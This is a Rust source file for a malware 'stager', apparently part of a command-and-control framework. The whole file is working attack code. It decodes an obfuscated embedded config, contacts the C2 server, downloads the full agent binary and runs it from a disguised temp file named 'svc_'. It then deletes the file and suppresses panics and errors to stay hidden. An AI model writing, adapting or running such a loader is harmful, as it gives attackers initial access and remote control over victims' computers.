// src/bin/stager.rs
//
// Minimal stager payload. Downloads the full agent binary from the C2
// server over TLS, writes it to a temp location, and executes it.
// Much smaller than the full agent (~50KB vs ~2MB+), making it suitable
// for initial access where payload size matters.
//
// The stager config (C2 host, port, etc.) is embedded at build time
// via the same C2_BUILD_CONFIG mechanism as the full agent.

use std::fs;
use std::process::Command;
use std::io::Write;

mod config {
    use serde::Deserialize;

    #[derive(Deserialize)]
    pub struct StagerConfig {
        pub c2_host: String,
        pub tunnel_port: u16,
        pub build_id: String,
        #[serde(default = "default_stage_path")]
        pub stage_path: String,
    }

    fn default_stage_path() -> String { "/stage".into() }

    include!(concat!(env!("OUT_DIR"), "/obfuscated_config.rs"));
    include!(concat!(env!("OUT_DIR"), "/bloat_data.rs"));

    pub fn load() -> StagerConfig {
        use_bloat();
        let json = get_config();
        match serde_json::from_str(&json) {
            Ok(c) => c,
            Err(_) => std::process::exit(1),
        }
    }
}

fn main() {
    // Suppress panics
    std::panic::set_hook(Box::new(|_| {}));

    let cfg = config::load();
    let url = format!("https://{}:{}/stage/{}", cfg.c2_host, cfg.tunnel_port, cfg.build_id);

    // Attempt download via native TLS
    match download_stage(&url) {
        Ok(payload) => {
            if let Err(e) = execute_payload(&payload) {
                if cfg!(debug_assertions) { eprintln!("[-] Exec failed: {}", e); }
            }
        }
        Err(e) => {
            if cfg!(debug_assertions) { eprintln!("[-] Download failed: {}", e); }
            // Retry with manual HTTP
            let addr = format!("{}:{}", cfg.c2_host, cfg.tunnel_port);
            if let Ok(payload) = download_raw_tcp(&addr, &cfg.build_id) {
                let _ = execute_payload(&payload);
            }
        }
    }
}

fn download_stage(url: &str) -> Result<Vec<u8>, String> {
    // Use reqwest if available, otherwise fall back to raw TCP
    let resp = reqwest::blocking::get(url).map_err(|e| e.to_string())?;
    if !resp.status().is_success() {
        return Err(format!("HTTP {}", resp.status()));
    }
    resp.bytes().map(|b| b.to_vec()).map_err(|e| e.to_string())
}

fn download_raw_tcp(addr: &str, build_id: &str) -> Result<Vec<u8>, String> {
    use std::net::TcpStream;
    use std::io::{Read, Write};

    let mut stream = TcpStream::connect(addr).map_err(|e| e.to_string())?;
    let request = format!(
        "GET /stage/{} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
        build_id, addr
    );
    stream.write_all(request.as_bytes()).map_err(|e| e.to_string())?;

    let mut response = Vec::new();
    stream.read_to_end(&mut response).map_err(|e| e.to_string())?;

    // Skip HTTP headers
    if let Some(pos) = response.windows(4).position(|w| w == b"\r\n\r\n") {
        Ok(response[pos + 4..].to_vec())
    } else {
        Ok(response)
    }
}

fn execute_payload(payload: &[u8]) -> Result<(), String> {
    let temp_dir = std::env::temp_dir();
    let ext = if cfg!(target_os = "windows") { ".exe" } else { "" };
    let temp_path = temp_dir.join(format!("svc_{}{}", uuid_simple(), ext));

    fs::write(&temp_path, payload).map_err(|e| e.to_string())?;

    #[cfg(unix)] {
        use std::os::unix::fs::PermissionsExt;
        let _ = fs::set_permissions(&temp_path, fs::Permissions::from_mode(0o755));
    }

    Command::new(&temp_path)
        .spawn()
        .map_err(|e| e.to_string())?;

    // Wait a moment then clean up the file reference (process keeps running)
    std::thread::sleep(std::time::Duration::from_secs(2));
    let _ = fs::remove_file(&temp_path);

    Ok(())
}

/// Simple pseudo-UUID without pulling in the uuid crate
fn uuid_simple() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let t = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default();
    format!("{:x}{:x}", t.as_secs(), t.subsec_nanos())
}
